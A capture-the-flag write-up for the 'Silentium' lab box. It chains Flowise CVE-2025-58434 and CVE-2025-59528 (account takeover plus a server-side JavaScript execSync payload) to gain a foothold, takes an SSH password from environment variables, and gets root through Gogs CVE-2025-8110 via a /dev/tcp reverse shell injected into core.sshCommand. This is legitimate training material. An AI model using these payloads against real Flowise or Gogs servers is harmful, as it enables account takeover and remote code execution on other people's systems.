# CTF – Silentium (Writeup)

## Context
Silentium is a Linux box centered on a Flowise instance (an LLM/agent builder) served
at `staging.silentium.htb`. The Flowise version, disclosed in a bundled JS file, is
`<= 3.0.5` and vulnerable to an account-takeover plus RCE chain. Post-foothold, a Gogs
server running internally provides the path to root.

## Recon
The Flowise version string was leaked in one of the application's JavaScript bundles,
which flagged the known CVE chain. Flowise's login API (`/api/v1/auth/login`) responds
differently for existing vs non-existing accounts, so it doubles as a user-enumeration
oracle. Internally, Gogs listens on port `3001`.

## User enumeration
I used `brute.sh` to enumerate valid accounts against the login endpoint. The script
posts `{"email":"<user>@silentium.htb","password":"password"}` for each name in a
wordlist and classifies the HTTP status:

- `404` → user does not exist
- `401` / `403` → user exists (wrong password)
- `200` → valid credentials

```bash
cat usernames.txt | xargs -I {} -P 10 bash -c '
  email="{}@silentium.htb"
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    "http://staging.silentium.htb/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"password\"}")
  ...
'
```

In practice the valid user (`ben@silentium.htb`) was also just listed on the site's
home page, so the enumeration only confirmed it.

## Initial access – Flowise ATO + CustomMCP RCE
Foothold uses `flowise_chain.py`, which chains two CVEs against Flowise `<= 3.0.5`:

- **CVE-2025-58434** – unauthenticated password-reset token disclosure. A POST to
  `/api/v1/account/forgot-password` with the target email returns the account's
  `tempToken` directly in the JSON response. That token is then replayed against
  `/api/v1/account/reset-password` to set a new password.
- **CVE-2025-59528** – JS injection in the `CustomMCP` node. A POST to
  `/api/v1/node-load-method/customMCP` with `loadMethod: listActions` and a crafted
  `mcpServerConfig` executes JavaScript server-side:

  ```js
  ({x:(function(){
    const cp=process.mainModule.require("child_process");
    cp.execSync("<command>");
    return 1;
  })()})
  ```

Run:

```
python3 flowise_chain.py -t http://staging.silentium.htb -e ben@silentium.htb
```

Because 3.0.5 doesn't fully honor the reset for programmatic login, the script pauses
for a manual step: log into the UI with the reset password, copy the API key from
`/apikey`, paste it back, and it uses that key to fire the CustomMCP RCE (a `mkfifo`
reverse shell). That gave me a shell.

## Lateral movement – env vars → SSH as ben
Reading the environment from the shell (`env`) exposed two passwords:

```
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
```

`SMTP_PASSWORD` (`r04D!!_R4ge`) worked as `ben`'s SSH password.

## Tunneling to Gogs
Gogs was listening on `3001`, bound to localhost, so I forwarded it:

```
ssh -L 3001:127.0.0.1:3001 ben@<HTB_IP>
```

I registered an account in the Gogs UI and generated a personal access token under
Settings → Applications.

## Privilege escalation – Gogs CVE-2025-8110 (symlink + sshCommand injection)
CVE-2025-8110 is an authenticated RCE in Gogs. The exploit:

1. Creates a repository via the API and pushes a **symbolic link** named
   `malicious_link` pointing to `.git/config`.
2. Uses the contents API (`PUT /api/v1/repos/<user>/<repo>/contents/malicious_link`)
   to overwrite the real `.git/config` through the symlink.
3. The poisoned config sets `core.sshCommand` to a reverse shell:
   `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1' #`. When Gogs next runs a git
   operation that needs a transport, it invokes `sshCommand` and the shell fires.

```
python3 CVE-2025-8110.py \
  -u http://localhost:3001 \
  -lh 10.10.14.2 -lp 5555 \
  -user hacker -pass Hacker123!
```

The Gogs service ran as root, so the reverse shell landed as root.

## Conclusion
Version disclosure in a JS bundle pointed at a Flowise ATO (CVE-2025-58434) + CustomMCP
RCE (CVE-2025-59528) chain for the foothold. Environment variables leaked an SSH
password for `ben`. An internal Gogs instance, reached by SSH port forward, was then
exploited via CVE-2025-8110 (symlink-based `.git/config` overwrite → `sshCommand`
injection) to get root.

## Skills demonstrated
- Version fingerprinting from client-side JS
- HTTP status-based user enumeration (scripted)
- Chaining an unauthenticated ATO with an authenticated RCE (Flowise)
- Credential discovery from process environment variables
- SSH local port forwarding to reach internal services
- Exploiting Gogs CVE-2025-8110 (symlink path traversal + `sshCommand` injection)
